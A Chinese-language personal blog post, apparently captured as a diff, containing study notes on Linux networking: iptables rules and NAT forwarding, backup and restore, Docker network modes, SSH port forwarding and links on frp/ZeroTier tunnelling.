+<blockquote>
+<p>curl -o test.html <a target="_blank" rel="noopener" href="https://www.qianzhigang.com/archives/880.html">https://www.qianzhigang.com/archives/880.html</a></p>
+</blockquote>
+<p>-o: 该参数将文件保存为命令行中默认的文件名保存文件到本地</p>
+<h3 id="测试Linux服务器能否连通外网的命令："><a href="#测试Linux服务器能否连通外网的命令：" class="headerlink" title="测试Linux服务器能否连通外网的命令："></a>测试Linux服务器能否连通外网的命令：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br><span class="line"></span><br><span class="line">curl -I www.baidu.com</span><br><span class="line"></span><br><span class="line">traceroute www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="iptables-学习"><a href="#iptables-学习" class="headerlink" title="iptables 学习"></a>iptables 学习</h3><h4 id="iptables简介"><a href="#iptables简介" class="headerlink" title="iptables简介"></a>iptables简介</h4><p>iptables 是集成在 Linux 内核中的包过滤防火墙系统。使用 iptables 可以添加、删除具体的过滤规则，iptables 默认维护着 4 个表和 5 个链，所有的防火墙策略规则都被分别写入这些表与链中。</p>
+<p>“<strong>四表</strong>”是指 iptables 的功能，默认的 iptable s规则表有 filter 表（过滤规则表）、nat 表（地址转换规则表）、mangle（修改数据标记位规则表）、raw（跟踪数据表规则表）：</p>
+<p>filter 表：控制数据包是否允许进出及转发，可以控制的链路有 INPUT、FORWARD 和 OUTPUT。<br>nat 表：控制数据包中地址转换，可以控制的链路有 PREROUTING、INPUT、OUTPUT 和 POSTROUTING。<br>mangle：修改数据包中的原数据，可以控制的链路有 PREROUTING、INPUT、OUTPUT、FORWARD 和 POSTROUTING。<br>raw：控制 nat 表中连接追踪机制的启用状况，可以控制的链路有 PREROUTING、OUTPUT。</p>
+<p>“<strong>五链</strong>”是指内核中控制网络的 NetFilter 定义的 5 个规则链。每个规则表中包含多个数据链：INPUT（入站数据过滤）、OUTPUT（出站数据过滤）、FORWARD（转发数据过滤）、PREROUTING（路由前过滤）和POSTROUTING（路由后过滤），防火墙规则需要写入到这些具体的数据链中。</p>
+<p>Linux 防火墙的过滤框架，如图所示。</p>
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/ce49aedfc45c82ef6a6f261c82af07a4.gif" class title="Linux命令">
+
+<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ5OTQ2OTE2,size_16,color_FFFFFF,t_70#pic_center.png" class title="在这里插入图片描述">
+
+<p>可以看出，如果是外部主机发送数据包给防火墙本机，数据将会经过 PREROUTING 链与 INPUT 链；如果是防火墙本机发送数据包到外部主机，数据将会经过 OUTPUT 链与 POSTROUTING 链；如果防火墙作为路由负责转发数据，则数据将经过 PREROUTING 链、FORWARD 链以及 POSTROUTING 链。</p>
+<h4 id="命令与扩展"><a href="#命令与扩展" class="headerlink" title="命令与扩展"></a>命令与扩展</h4><ul>
+<li>查看规则</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -nvL</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">可以单独-L也可以加--line-number</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>添加规则</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s 192.168.1.5 -j DROP</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改规则</p>
+</li>
+</ul>
+<p>-R：替换</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -R INPUT 6 -s 194.168.1.5 -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>删除规则</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -D INPUT 6 -s 194.168.1.5 -j ACCEPT</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">或者</span></span><br><span class="line">iptables -D INPUT 6</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>清空表上的所有规则，默认为filter表：<blockquote>
+<p>iptables -F</p>
+</blockquote>
+</li>
+</ul>
+<p>链上操作规则，A追加，I前面插入，D删除，R替换，N新建一个自定义链，例如：</p>
+<ul>
+<li><p>在第5条规则前插入禁止非192.168.1.0&#x2F;24访问80端口</p>
+<blockquote>
+<p>iptables -I INPUT 5 -p tcp –dport 80 ! -s 192.168.1.0&#x2F;24 -j DROP</p>
+</blockquote>
+</li>
+<li><p>查看某个表的所有链上的规则：</p>
+<blockquote>
+<p>iptables -t nat -L -n -v –line-numbers</p>
+</blockquote>
+</li>
+<li><p>filter表，常将lo网卡和已建立连接的规则放在最前面，降低系统负担：</p>
+<blockquote>
+<p>iptables -A INPUT -i lo -j ACCEPT<br>iptables -A INPUT -m state –state ESTABLISHED,RELATED -j ACCEPT</p>
+</blockquote>
+</li>
+<li><p>允许ping：</p>
+<blockquote>
+<p>iptables -A INPUT -p icmp –icmp-type 8 -j ACCEPT</p>
+</blockquote>
+</li>
+<li><p>允许连续范围端口：</p>
+<blockquote>
+<p>iptables -A INPUT -p udp –sport 1000:2000 -j ACCEPT</p>
+</blockquote>
+</li>
+</ul>
+<p>每个链都有默认规则，禁止时可以设置白名单，允许时可以设置黑名单，-P：设置链默认规则</p>
+<ul>
+<li>INPUT链默认禁止连接：<blockquote>
+<p>iptables -P INPUT DROP</p>
+</blockquote>
+</li>
+</ul>
+<p>iptables有很多扩展，不同的扩展有不同的功能，查看文档，man iptables-extensions常用的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#多端口扩展，-m multiport --dports 80,443</span></span><br><span class="line"><span class="comment">#recent扩展，每30秒最多10个连接：</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --<span class="built_in">set</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP</span><br><span class="line"><span class="comment">#connlimit扩展，限制并发连接数：</span></span><br><span class="line">iptables -I INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 100 -j REJECT</span><br><span class="line"><span class="comment">#string扩展，字符串匹配禁止：</span></span><br><span class="line">iptables -I INPUT -p tcp --sport 443 -m string --string <span class="string">&quot;xunlei&quot;</span> --algo kmp -j DROP</span><br></pre></td></tr></table></figure>
+
+<h4 id="iptables防火墙的备份与还原"><a href="#iptables防火墙的备份与还原" class="headerlink" title="iptables防火墙的备份与还原"></a>iptables防火墙的备份与还原</h4><p>CentOS 7 系统中防火墙规则默认保存在 &#x2F;etc&#x2F;sysconfig&#x2F;iptables 文件中，使用 iptables-save 将规则保存至该文件中可以实现保存防火墙规则的作用，计算机重启后会自动加载该文件中的规则。如果使用 iptables-save 将规则保存至其他位置，可以实现备份防火墙规则的作用。当防火墙规则需要做还原操作时，可以使用 iptables-restore 将备份文件直接导入当前防火墙规则。</p>
+<h5 id="iptables-save命令"><a href="#iptables-save命令" class="headerlink" title="iptables-save命令"></a>iptables-save命令</h5><p>iptables-save 命令用来批量导出 Linux 防火墙规则，语法介绍如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#保存在默认文件夹中（保存防火墙规则）： </span></span><br><span class="line">[root@liangxu ~]<span class="comment"># iptables-save &gt; /etc/sysconfig/iptables</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#保存在其他位置（备份防火墙规则）： </span></span><br><span class="line">[root@liangxu ~]<span class="comment"># iptables-save &gt; 文件名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#直接执行 iptables-save 命令：显示出当前启用的所有规则，按照 raw、mangle、nat、filter 表的顺序依次列出，如下所示：</span></span><br><span class="line">[root@liangxu ~]<span class="comment"># iptables-save </span></span><br><span class="line"><span class="comment"># Generated by iptables-save v1.4.7 on Thu Aug 27 07:06:36 2020 </span></span><br><span class="line">*filter </span><br><span class="line">:INPUT ACCEPT [0:0] </span><br><span class="line">:FORWARD ACCEPT [0:0] </span><br><span class="line">:OUTPUT ACCEPT [602:39026]</span><br><span class="line">COMMIT </span><br><span class="line"><span class="comment"># Completed on Thu Aug 27 07:06:36 2020</span></span><br></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<p>“#”号开头的表示注释；<br>“*filter”表示所在的表；<br>“：链名默认策略”表示相应的链及默认策略，具体的规则部分省略了命令名“iptables”；<br>在末尾处“COMMIT”表示提交前面的规则设置。</p>
+<p>备份到其他文件中。例如文件：text，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@liangxu ~]<span class="comment"># iptables-save &gt; test </span></span><br><span class="line">[root@liangxu ~]<span class="comment"># ls test </span></span><br><span class="line">[root@bogon ~]<span class="comment"># cat test </span></span><br><span class="line"><span class="comment"># Generated by iptables-save v1.4.7 on Thu Aug 27 07:09:47 2020</span></span><br><span class="line">*filter ......</span><br><span class="line"></span><br><span class="line"><span class="comment">#列出nat表的规则内容，命令如下：</span></span><br><span class="line">[root@liangxu ~]<span class="comment"># iptables-save -t nat</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="iptables-restore命令"><a href="#iptables-restore命令" class="headerlink" title="iptables-restore命令"></a>iptables-restore命令</h5><p>iptables-restore 命令可以批量导入Linux防火墙规则，同时也需要结合重定向输入来指定备份文件的位置。命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@liangxu ~]<span class="comment"># iptables-restore &lt; 文件名称</span></span><br></pre></td></tr></table></figure>
+
+<p>注意，导入的文件必须是使用 iptables-save工具导出来的才可以。</p>
+<p>先使用 iptables-restore 命令还原 text 文件，然后使用 iptables -t nat -nvL 命令查看清空的规则是否已经还原，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@liangxu ~]<span class="comment"># iptables-restore &lt; test </span></span><br><span class="line"></span><br><span class="line">[root@liangxu ~]<span class="comment"># iptables -t nat -nvL </span></span><br><span class="line"></span><br><span class="line">Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt <span class="keyword">in</span> out <span class="built_in">source</span> destination</span><br><span class="line"></span><br><span class="line">Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt <span class="keyword">in</span> out <span class="built_in">source</span> destination</span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt <span class="keyword">in</span> out <span class="built_in">source</span> destination</span><br></pre></td></tr></table></figure>
+
+<h5 id="iptables-services命令"><a href="#iptables-services命令" class="headerlink" title="iptables-services命令"></a>iptables-services命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#systemctl stop firewalld</span></span><br><span class="line"><span class="comment">#systemctl disable firewalld</span></span><br><span class="line">yum -y install iptables-services</span><br><span class="line">service iptables save</span><br><span class="line">service iptables reload</span><br></pre></td></tr></table></figure>
+
+<h4 id="iptables-完成TCP转发实验"><a href="#iptables-完成TCP转发实验" class="headerlink" title="iptables 完成TCP转发实验"></a>iptables 完成TCP转发实验</h4><p>Iptables的知识点：<br>1.就是docker的网络服务是基于iptables的，iptables -L 看到有很多docker网段相关的规则就行<br>2.某个节点能出网，master出不了网。所以看看能不能在节点搞个反向代理，把外网的admin.dnslog.bid:9002，映射到master的9002端口。</p>
+<p>Master通过节点出网</p>
+<p>master</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 9002 -j DNAT --to 172.17.36.146:59002</span><br><span class="line"><span class="comment">#在NAT表中，将经过防火墙的TCP流量到达9002端口的流量重定向到172.17.36.146服务器的59002端口上。例如，当外部用户访问服务器的9002端口时，该规则将会把流量重定向到172.17.36.146服务器的59002端口上，从而确保访问能够成功。这种规则的应用场景包括端口映射和负载均衡等，可以实现网络流量的灵活转发和管理。-j DNAT：指定动作为目的地址重映射</span></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 172.17.36.146 --dport 59002 -j SNAT --to 172.21.122.127</span><br><span class="line"><span class="comment">#此规则的作用是在NAT表中，当流量经过防火墙，目标IP地址为172.17.36.146且目标端口为59002时，将流量的源IP地址改为172.21.122.127。这种规则通常用于Masquerading NAT，即网络地址转换，将私有地址转换为公共地址，以实现网络访问。例如，当从172.17.36.146服务器的59002端口返回数据包时，防火墙将根据该规则将源IP地址改为172.21.122.127，以确保正确地路由回网络。 -j SNAT：指定动作为源地址重映射，即将流量的源地址改为指定的IP地址，-j表示指定动作</span></span><br><span class="line">iptables -t filter -I FORWARD -s 172.0.0.0/8 -d 0.0.0.0/0 -j ACCEPT</span><br><span class="line"><span class="comment">#此规则的作用是在filter表中，允许通过防火墙的从172.0.0.0/8地址段到0.0.0.0/0地址段的数据包。该规则通常用于实现基于IP地址段的访问控制，例如允许内部网络访问互联网。</span></span><br></pre></td></tr></table></figure>
+
+<p>slave</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 59002 -j DNAT --to 47.56.183.123:9002</span><br><span class="line"><span class="comment">#在NAT表中，将经过防火墙且目标端口为59002的TCP流量，重定向到47.56.183.123的9002端口</span></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 47.56.183.123 --dport 9002 -j SNAT --to 172.17.36.146</span><br><span class="line"><span class="comment">#在NAT表中，当流量经过防火墙，目标IP地址为47.56.183.123且目标端口为9002时，将流量的源IP地址改为172.17.36.146。</span></span><br><span class="line">iptables -t filter -I FORWARD -s 172.0.0.0/8 -d 0.0.0.0/0 -j ACCEPT</span><br></pre></td></tr></table></figure>
+<p>在Master节点上，这两条规则的作用是将流量从master的9002端口重定向到Slave节点的59002端口，并将响应数据的源IP地址改为Master节点的IP地址，以便Master节点可以接收到响应数据。</p>
+<p>在slave节点上，将流量从slave节点的59002端口重定向到外网admin.dnslog.bid的9002端口，并将响应数据的源IP地址改为slave节点的ip地址，以便slave节点可以接收到响应数据。</p>
+<p>最终做到了把外网的admin.dnslog.bid:9002，映射到master的9002端口。</p>
+<h3 id="Docker-容器网络和-IPtables-间的亲密关系"><a href="#Docker-容器网络和-IPtables-间的亲密关系" class="headerlink" title="Docker 容器网络和 IPtables 间的亲密关系"></a>Docker 容器网络和 IPtables 间的亲密关系</h3><h4 id="docker网络类型"><a href="#docker网络类型" class="headerlink" title="docker网络类型"></a><strong>docker网络类型</strong></h4><ul>
+<li>Bridge模式</li>
+</ul>
+<p>bridge模式是docker默认的网络设置，此模式会为每个容器分配network namespace、设置ip等，并将一个主机的docker容器连接到一个虚拟网络上。</p>
+<p>当<code>Docker</code>进程启动时，会在主机上创建一个名为<code>docker0</code>的虚拟网桥，此主机上启动的<code>Docker</code>容器会连接到这个虚拟网桥上。虚拟网桥的工作方式和物理交换机类似，这样主机上的所有容器就通过交换机连在了一个二层网络中。从<code>docker0</code>子网中分配一个 IP 给容器使用，并设置 docker0 的 IP 地址为容器的<strong>默认网关</strong>。在主机上创建一对虚拟网卡<code>veth pair</code>设备，Docker 将 veth pair 设备的一端放在新创建的容器中，并命名为<code>eth0</code>（容器的网卡），另一端放在主机中，以<code>vethxxx</code>这样类似的名字命名，并将这个网络设备加入到 docker0 网桥中。<code>bridge</code>模式是 docker 的默认网络模式，不写<code>–net</code>参数，就是<code>bridge</code>模式。使用<code>docker run -p</code>时，docker 实际是在<code>iptables</code>做了<code>DNAT</code>规则，实现端口转发功能。可以使用<code>iptables -vnL</code>查看。</p>
+<ul>
+<li>Host模式</li>
+</ul>
+<p>如果启动容器的时候使用<code>host</code>模式，那么这个容器将不会获得一个独立的<code>Network Namespace</code>，而是和宿主机共用一个 Network Namespace。容器将不会虚拟出自己的网卡，配置自己的 IP 等，而是使用宿主机的 IP 和端口。但是，容器的其他方面，如文件系统、进程列表等还是和宿主机隔离的。</p>
+<ul>
+<li>Container模式</li>
+</ul>
+<p>这个模式指定新创建的容器和已经存在的一个容器共享一个 Network Namespace，而不是和宿主机共享。新创建的容器不会创建自己的网卡，配置自己的 IP，而是和一个指定的容器共享 IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过 lo 网卡设备通信。</p>
+<ul>
+<li>None模式</li>
+</ul>
+<p>使用<code>none</code>模式，Docker 容器拥有自己的 Network Namespace，但是，并不为Docker 容器进行任何网络配置。也就是说，这个 Docker 容器没有网卡、IP、路由等信息。需要我们自己为 Docker 容器添加网卡、配置 IP 等。</p>
+<h4 id="Docker和iptables之间存在密切的关系"><a href="#Docker和iptables之间存在密切的关系" class="headerlink" title="Docker和iptables之间存在密切的关系"></a>Docker和iptables之间存在密切的关系</h4><p>在Docker中，iptables被用于创建和管理容器之间的网络规则，以及容器与外部网络的通信。当创建一个Docker容器时，Docker会自动为该容器创建一个虚拟网络接口，并使用iptables规则将该容器与其他容器或宿主机连接起来。通过iptables，容器可以相互通信，或者与外部网络进行通信。例如，当一个容器需要访问外部网络时，Docker可以使用iptables规则来实现网络地址转换（NAT）和端口映射，将容器内部的IP地址映射到宿主机的IP地址上，从而实现容器与外部网络的通信。</p>
+<h3 id="使用ssh命令将内网端口发布到远程服务器"><a href="#使用ssh命令将内网端口发布到远程服务器" class="headerlink" title="使用ssh命令将内网端口发布到远程服务器"></a>使用ssh命令将内网端口发布到远程服务器</h3><p>参数解释：</p>
+<p>-C：请求压缩数据</p>
+<p>-f：后台执行ssh指令</p>
+<p>-N：不执行远程指令，处于等待状态</p>
+<p>-g：允许远程主机连接主机的转发端口</p>
+<p>-L：本地转发</p>
+<p>-R：远程转发</p>
+<h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><p>确保本地机器与远端服务器都已安装SSH客户端和服务端，并确保5672端口没有被占用。</p>
+<p><strong>SSH服务器配置</strong></p>
+<p>在远程服务器的SSH配置文件（通常位于<code>/etc/ssh/sshd_config</code>）中，检查以下设置：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AllowTcpForwarding</span> yes</span><br><span class="line"><span class="title class_">GatewayPorts</span> yes</span><br></pre></td></tr></table></figure>
+
+<h4 id="命令行使用方法"><a href="#命令行使用方法" class="headerlink" title="命令行使用方法"></a>命令行使用方法</h4><p>在Linux终端中，可以使用以下命令实现端口映射：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">表示将本地的5672端口映射到远程服务器的5672端口。</span></span><br><span class="line">ssh -L 5672:localhost:5672 用户名@远程服务器地址</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将发往本机的80端口访问转发到174.139.9.66的8080端口</span></span><br><span class="line">ssh -C -f -N -g -L 80:174.139.9.66:8080 master@174.139.9.66</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">讲发往174.139.9.66的8080访问转发到本机的80端口</span></span><br><span class="line">ssh -C -f -N -g -R 80:174.139.9.66:8080 master@174.139.9.66</span><br></pre></td></tr></table></figure>
+
+<p><strong>结合使用-f和-N</strong></p>
+<p>当我们只是想设置端口映射，并希望SSH命令在后台运行时。命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -L 5672:localhost:5672 用户名@远程服务器地址</span><br></pre></td></tr></table></figure>
+
+<h3 id="熟练使用zerotier、frps进行内网穿透，并设置策略"><a href="#熟练使用zerotier、frps进行内网穿透，并设置策略" class="headerlink" title="熟练使用zerotier、frps进行内网穿透，并设置策略"></a>熟练使用zerotier、frps进行内网穿透，并设置策略</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44786530/article/details/128283075">ZeroTier实现内网穿透详细教程，其实5分钟就可以搞定-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1MY41187VM/?spm_id_from=333.337.search-card.all.click&vd_source=5a9c70704d37d5aa98c6981b68b9d788">内网穿透-公网访问内网_哔哩哔哩_bilibili</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cxfs/p/11304085.html">配置frp实现内网穿透 - 遗失的美好灬 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cxfs/p/13071969.html">frp 实现内网穿透（Windows 版） - 遗失的美好灬 - 博客园 (cnblogs.com)</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/" rel="tag"><i class="fa fa-tag"></i> 学习计划</a>
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag"><i class="fa fa-tag"></i> 网络协议</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/10/07/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="prev" title="Linux操作系统">
+                  <i class="fa fa-angle-left"></i> Linux操作系统
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/10/19/Docker%E5%8F%8Adocker-compose/" rel="next" title="Docker及docker-compose">
+                  Docker及docker-compose <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Yaura Chan</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.20/fancybox/fancybox.umd.js" integrity="sha256-q8XkJ6dj5VwSvzI8+nATCHHQG+Xv/dAZBCgqmu93zOY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
